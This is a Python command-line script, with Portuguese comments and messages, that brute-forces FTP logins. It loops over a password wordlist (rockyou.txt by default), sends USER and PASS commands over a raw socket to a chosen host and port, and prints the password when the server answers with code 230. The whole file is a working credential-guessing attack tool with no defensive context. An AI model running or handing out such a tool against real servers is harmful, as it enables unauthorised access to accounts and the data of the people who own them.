import socket
import sys
import re
import argparse
import os

def brute_force_ftp(target, user, wordlist, port):
    try:
        with open(wordlist, 'rb') as f:
            for palavra in f.readlines():
                senha = palavra.decode('utf-8').strip()
                print(f"Realizando Brute Force: {user}:{senha}")
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                
                try:
                    s.connect((target, port))
                except socket.error as err:
                    print(f"Erro ao conectar a {target} na porta {port}: {err}")
                    continue
                
                s.recv(1024)

                s.send(f"USER {user}\r\n".encode())
                s.recv(1024)
                s.send(f"PASS {senha}\r\n".encode())
                resposta = s.recv(1024).decode()
                s.send("QUIT\r\n".encode())

                if re.search('230', resposta):
                    print(f"[+] Senha encontrada ----> {senha}")
                    break
    except FileNotFoundError:
        print(f"[-] Wordlist não encontrada no caminho: {wordlist}")
        sys.exit()

# Função principal para parsear os argumentos
def main():
    parser = argparse.ArgumentParser(description="Script de Brute Force FTP.")
    
    # Argumentos
    parser.add_argument('-t', '--target', required=True, help="Endereço IP ou hostname do alvo")
    parser.add_argument('-u', '--user', required=True, help="Usuário FTP")
    parser.add_argument('-w', '--wordlist', help="Caminho para a wordlist (padrão: /usr/share/wordlists/rockyou.txt)")
    parser.add_argument('-p', '--port', type=int, default=21, help="Porta FTP (padrão: 21)")
    
    # Parseando argumentos
    args = parser.parse_args()
    
    target = args.target
    user = args.user
    wordlist = args.wordlist or '/usr/share/wordlists/rockyou.txt'  # Caminho padrão para a wordlist
    
    # Verifica se a wordlist existe
    if not os.path.isfile(wordlist):
        print(f"[-] Wordlist não encontrada no caminho: {wordlist}")
        sys.exit()
    
    port = args.port
    
    # Executa o brute force
    brute_force_ftp(target, user, wordlist, port)

if __name__ == "__main__":
    main()
